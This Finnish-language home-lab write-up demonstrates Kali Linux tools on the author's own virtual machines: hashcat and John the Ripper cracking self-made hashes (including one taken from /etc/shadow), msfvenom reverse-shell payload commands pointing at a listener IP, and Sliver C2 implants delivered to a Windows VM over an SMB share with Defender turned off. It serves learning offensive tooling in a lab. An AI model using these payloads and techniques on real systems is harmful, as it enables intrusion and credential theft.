TIETOKONE: Lenovo Thinkpad

YMPÄRISTÖ: Oracle Virtualbox (OS) Kali Linux 10GB ram allocated

MISSÄ: Kotona

Tämän projektin tarkoitus on näyttää, Kali Linuxin erilaisia työkaluja, miten niitä käytetään ja miten niitä asennetaan. 

Projektin tavoitteet:

- Näyttää erilaisia työkaluja
- Mitä on mahdollista tehdä Kali Linuxsissa



--------------Projekti---------------

Tässä haluan näyttää miten Hashcat toimii.

Hashcatti asennettu (defaultti kali linuxissa)

<img width="783" height="851" alt="image" src="https://github.com/user-attachments/assets/12cbf69c-af27-475b-8385-34f6e12c233f" />

Tässä tehtävässä yritän murtaa sha256 salasanan, salasanaksi valitsen "Esimerkki"

Ensiksi minun pitää tietää salasanan hash, jotta voisin yritää murtaa salasanaa

Hashin generoimiseksi käytin komentoa 

``echo -n "Esimerkki" | sha256sum``

Komento tulostaa tekstin "Esimerkki" ilman rivinvaihtoa lopussa (-n-lippu estää rivinvaihdon lisäämisen)

| - ohjaa "Esimerkki" seuraavalle komennolle

sha256sum - laskee syötteen SHA-256-tiivisteeseen

<img width="765" height="104" alt="image" src="https://github.com/user-attachments/assets/ed6c5c94-6b98-49bd-ad8b-513b653915da" />

Nyt kun meillä on salasanan hash tiedossa, voimme kohdistaa siihen hyökkäyksen.

Jotta tietäisin mitä hash murtautumisalgoritmiä käyttäisin, pitää ensiksi selvittää millä hashalgoritmillä salasana on suojattu. Sitävarten käytin hashid komentoa.

``hashid -m e750227bc33fb86a5b7fec0c6da90ce0ae45064e5394eea5353c8b818e2d96df``

hashid on työkalu millä tunnistetaan hash tyypin. 

-m - näyttää Hashcat-moodin numeron tunnistettua hashia kohtaan.

<img width="755" height="198" alt="image" src="https://github.com/user-attachments/assets/3de44fde-686b-4dc8-a227-ea1b467e547d" />

Jos tämä olisi oikea hyökkäys niin lähtisin kokeilemaan erilaisia hashcat modeja. Nyt kun tiedän että salasana on suojattu SHA-256 niin käytän sitä.

Seuraavaksi käytän komentoa 

``hashcat -m 1400 'e750227bc33fb86a5b7fec0c6da90ce0ae45064e5394eea5353c8b818e2d96df' rockyou.txt -o solved``

``hashcat = murtamistyökalu``

``-m 1400 - määrittää hashin tyypin``

``rockyou.txt - sanakirjatiedosto``

``-o solved - tallentaa ratkaistun salasanan tiedostoon solved``

<img width="787" height="76" alt="image" src="https://github.com/user-attachments/assets/5b56d525-d7bf-4704-a68d-911d6cb52856" />

Komennon jälkeen sain salasanan tallennettuna ja se näyttää tältä 

<img width="557" height="61" alt="image" src="https://github.com/user-attachments/assets/36902af8-348d-4584-bdfb-46409ca60548" />


Tein PDF tiedoston, minkä suojasin salasanalla "123456789a".

Yritän murtaa salasanan john the ripperillä. Ensiksi teen pdf tiedostosta hash tiedoston

<img width="785" height="114" alt="image" src="https://github.com/user-attachments/assets/5a07377d-450a-4051-a861-d5aa05bf1f70" />

Tarkistetaan että hash tiedosto on generoitu oikein

<img width="778" height="118" alt="image" src="https://github.com/user-attachments/assets/9ffb17bf-fc79-4eaf-a1ec-f9fbf710fa29" />

Lisäsin oman tekemän salasanan john the ripperin password tiedostoon

<img width="782" height="840" alt="image" src="https://github.com/user-attachments/assets/3c5923cc-3b68-418b-8f07-f90a608f7a02" />

Käytän komentoa 

``john common-1.pdf.hash``

<img width="779" height="58" alt="image" src="https://github.com/user-attachments/assets/1da2c058-eed4-40ea-a3e7-fe1ea4ae230d" />

Kuitenkaan en saanut salasanaa avattua, sillä koko kali linux kaatui. 

Pienen jumpan jälkeen sain kalin uudestaan käyntiin, ja ajattelin, johtuuko ongelma siitä että en ollut valinnut oikeata wordlistiä.

<img width="786" height="227" alt="image" src="https://github.com/user-attachments/assets/0566f8d8-f4f7-4bd5-8705-ac8a67de4f4a" />

Sen jälkeen kun olin valinnut oikean wordlistin, meni john paljon nopeammin läpi ja ei kaatanut ympäristöä. 

Mutta ei kuitenkaan onnistunut, sillä se ei löytänyt kyseistä salasanaa. Päätin käyttää toista wordlistiä mikä on txt muodossa.

Tässä uudessa wordlisti2.txt tiedostossa on vain kyseinen salasana.

Ei silti tuottanut tulosa.

<img width="697" height="373" alt="image" src="https://github.com/user-attachments/assets/0c0960a7-f521-4f98-b26c-174b9defd386" />

Kysyin tekoälyltä neuvoa, ja se neuvosi käyttää ``--format=PDF`` komentoa.

--format=PDF flagi on vähän sama kuin hashcatin -m flagi, sillä john tietää että ollaan tekemisissä PDF tiedostojen salasanojen kanssa.

<img width="721" height="219" alt="image" src="https://github.com/user-attachments/assets/affa7862-b82f-446e-834b-fa61cbd3b416" />

Tämä näytti toimivan.

<img width="599" height="104" alt="image" src="https://github.com/user-attachments/assets/6275b7e5-504b-416d-b9e4-4dea79d523aa" />

Päätin tehdä linux käyttäjän ja yrittää murtaa käyttäjän salasanan.

Annoin käyttäjälle salasanaksi "123456789a".

<img width="783" height="265" alt="image" src="https://github.com/user-attachments/assets/13b9fa93-9b59-4fb4-b21c-ae4fee391e99" />

Pienen googlauksen jälkeen tuli selväksi, että linux tallentaa käyttäjien salasanat /etc/shadow file hakemistoon.

Päätin kulkea hakemistoon. 

``cd etc``

``cat shadow``

sieltä löysin password hashin.

<img width="768" height="48" alt="image" src="https://github.com/user-attachments/assets/ca96cef2-f85a-4652-9b4b-7ce48c2cb84b" />

Password hashistä tein txt tiedoston. (mielenkiintoista tässä on se, että tiedoston ei tarvitse olla .hash loppuinen, tajusin tämän vasta jälkikäteen, että unohdin laittaa .hash tiedoston loppuun mutta john silti onnistui salasanan murtautumisessa).

<img width="773" height="67" alt="image" src="https://github.com/user-attachments/assets/8b733399-f1af-4e85-8bfc-9370672589ca" />

Sitten käynnistin john the ripperin, iskin komentoon oikean formaatin ja wordlistin.

<img width="744" height="250" alt="image" src="https://github.com/user-attachments/assets/1a7d36d4-cdd8-4360-b475-5eca72534ecd" />

salasana murrettu.

<img width="512" height="151" alt="image" src="https://github.com/user-attachments/assets/1764e739-a58d-46c6-86b1-b96425a451ba" />


Ensiksi halusin nähdä, mitkä payloadit ovat msfvenomissa. 

-l = list

<img width="701" height="107" alt="image" src="https://github.com/user-attachments/assets/a5bf7727-3b8a-466f-988c-80ef81b7a86d" />

Tästä etsin reverse shell tyyppisen payloadin mikä näyttää hyvältä.

Listalla oli kuitenkin loputon määrä payloadei, joten kysyin tekoälyltä mikä olisi helpoin reverse shell payloadi mitä voisin yrittää conffaa.

Päätin käyttää reverse_netcat payloadia.

``msfvenom -p cmd/unix/reverse_netcat LHOST=192.168.1.100 LPORT=4444 -f raw``

-p = payload mitä käytetään

LHOST= hyökkääjän ip osoite (L = Listener)

LPORT= Listener Port (otin satunnaisen portin) 

-f raw = tiedosto tyyppi (raw tässä viittaa suoraan komentorivilitä executableen)

<img width="760" height="56" alt="image" src="https://github.com/user-attachments/assets/07229eba-1728-45c3-b8ae-bc48469f4c59" />

Tämä ei toiminut, en ainakaan saanut yhteyttä metasploitabeliin. Koitan toista tapaa, teen tiedostosta executablen.

Päätin käyttää reverse_tcp payloadia. (tekoälyn ehdottama)

``msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f elf -o reverse_shell.elf``

<img width="749" height="161" alt="image" src="https://github.com/user-attachments/assets/f90b415c-eca4-4754-9568-f8012aa0d054" />

``ls -la reverse_shell.elf``

tarkistin tiedoston sisällönm

<img width="566" height="55" alt="image" src="https://github.com/user-attachments/assets/1f505cd0-3535-4f2c-acda-2ce4e688ba8c" />

``chmod +x reverse_shell.elf``

tekee tiedostosta executablen

Avasin msfconsolen ja laitoin executableen kaiken tarvittavat tiedot

<img width="777" height="187" alt="image" src="https://github.com/user-attachments/assets/2cc20e98-5879-4b70-9ad2-8e695aaf7bf1" />

<img width="568" height="40" alt="image" src="https://github.com/user-attachments/assets/ffd02244-b9c6-4ca8-9e53-5f1597dc120f" />

tein palomuurin reiän ``ufw allow 4444``, tämä komentoo sallii 4444 tcp liikenteen.

<img width="766" height="54" alt="image" src="https://github.com/user-attachments/assets/04d7a248-be53-4198-95a1-f09aab5d7ef4" />

measploitti sai yhteyden.

Tässä yritän generoida implantin millä voin kuunella liikennettä.

Aloitin siitä, että asensin sliverin.

<img width="672" height="275" alt="image" src="https://github.com/user-attachments/assets/35eb766a-7202-4cfb-a67f-04a9e0a2c215" />

Navigoin oikeeseen hakemistoon missä sliver oli asennettu.

<img width="265" height="46" alt="image" src="https://github.com/user-attachments/assets/7e1cf694-b25f-48cb-add2-1958b56e9fe2" />

Käynnistin sliverin

<img width="515" height="236" alt="image" src="https://github.com/user-attachments/assets/5a496f94-a949-4beb-bba9-436c5733f79a" />

Aluksi yritin muutamaa tapaa generoida payloadi.

<img width="617" height="75" alt="image" src="https://github.com/user-attachments/assets/9bc5d860-8d65-4b70-bd07-9289a34cc8a2" />

Tämä tapa ei onnistunut, joten päätin lukea dokkeja vähäsen. 

Dokeissa annetaan esimerkki, missä 

'sliver > generate --http example.com --os mac'

Tästä päättelin, että pitääkö -http olla ip osoite, sen sijaan että käytän pelkkää localhostia. En myöskään specifoi lporttia, koska se tuotti ongelmia. Sliverin käyttää defaulttina porttia 80

Kuitenkin, generointi epäonnistui

<img width="544" height="135" alt="image" src="https://github.com/user-attachments/assets/0060ebc1-31cd-4cc3-b4fe-2b9f26a813f8" />

Kun katsoin error viestiä tarkemmin, tajusin, että sliverillä ei ole oikeuksia tehdä tiedostoa. Joten sulkesin sliverin ja runnasin ohjelman sudo sliver komennolla

Tämän jälkeen implantin generointikin onnistui. Käynnistin malwaren tiedoston ja silveriin syntyi sessio.

<img width="459" height="120" alt="image" src="https://github.com/user-attachments/assets/6b00915d-3e77-4135-9910-038756bf87cc" />

<img width="948" height="44" alt="image" src="https://github.com/user-attachments/assets/54a7781b-3e17-48eb-a88a-16c5784e068c" />

Tässä yritän tehdä uuden implantin, tämä implantti ottaa yhteyttä minun kohdekoneeseen windowsiin virtuaalikoneesta.

Haittaohjelman generointi oli helppoa, sillä osasin komennot jo.

<img width="922" height="153" alt="image" src="https://github.com/user-attachments/assets/dbdc2571-edac-4376-848e-6d9da2f5fcfa" />


Lataamisessa oli pieniä ongelmia, koitin aluksi kaikkia julkisia fileshare alustoja mutta ne ei näköjää halua levittää viruksia >.< 

Kysyin tekoälyltä neuvoja ja se neuvosi minut hostaa impacketing smbserverin. 

<img width="235" height="269" alt="image" src="https://github.com/user-attachments/assets/39045684-a837-49d0-a9f5-8ca2bbe14007" />

Sitten latasin tiedoston käyttäen CMDtä. Piti myös laitta windows defenderi pois päältä sillä se tunnisti ohjelman haitalliseksi.

<img width="564" height="56" alt="image" src="https://github.com/user-attachments/assets/8485d741-5c65-4c62-9453-63c2ee220339" />

Wiresharkilla löysin kali linuxin ja minun host OS välisen yhteyden.

<img width="812" height="141" alt="image" src="https://github.com/user-attachments/assets/26c92f7c-1172-4f35-a348-e5bfc687c430" />

VIITTEET:

https://www.openwall.com/john/doc/

https://hashcat.net/wiki/doku.php?id=hashcat

